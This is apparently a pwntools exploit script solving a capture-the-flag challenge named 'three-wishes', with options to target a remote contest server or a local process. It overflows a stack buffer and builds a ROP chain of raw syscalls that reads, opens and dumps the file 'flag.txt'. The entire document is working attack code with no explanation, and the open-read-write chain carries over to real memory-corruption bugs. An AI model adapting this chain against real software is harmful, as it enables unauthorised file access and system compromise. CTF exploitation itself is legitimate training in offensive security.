#!/usr/bin/env python3
from pwn import *

elf = ELF('./three-wishes')
rop = ROP(elf)
#libc = ELF('./libc')
#ld = ELF('./ld')

context(log_level='debug', binary=elf)

if args.REMOTE:
	io = remote('ccsc.mouflonarena.com', 31996)
elif args.GDB:
	io = process(elf.path)
	gdb.attach(io, gdbscript='''
    # b main
    catch syscall
    ''')
else:
	io = process(elf.path)

pad = b'A' * (72 - len(b'flag.txt\x00'))
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
syscall_ret = 0x452016
bss = elf.bss(0x400)
buf = 0x7fffffffdb10

log.success(f'''pop rax; ret = {hex(pop_rax)}\n
            pop rdi; ret = {hex(pop_rdi)}\n
            pop rsi; ret = {hex(pop_rsi)}\n
            pop rdx; ret = {hex(pop_rdx)}\n
            ret = {hex(ret)}\n
            syscall = {hex(syscall_ret)}
            '''
            )

payload = flat(
    b'A' * 72,

    # read(0, bss, 9) -> pulls "flag.txt\x00" into .bss
    pop_rax, 0,
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, 9,
    syscall_ret,

    # open(bss, 0)
    pop_rax, 2,
    pop_rdi, bss,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall_ret,

    # read(3, bss, 0x100)
    pop_rax, 0,
    pop_rdi, 3,
    pop_rsi, bss,
    pop_rdx, 0x100,
    syscall_ret,

    # write(1, bss, 0x100)
    pop_rax, 1,
    pop_rdi, 1,
    pop_rsi, bss,
    pop_rdx, 0x100,
    syscall_ret,
)

io.sendafter(b'lamp: ', payload)
io.sendline(b'flag.txt\x00')

io.interactive()
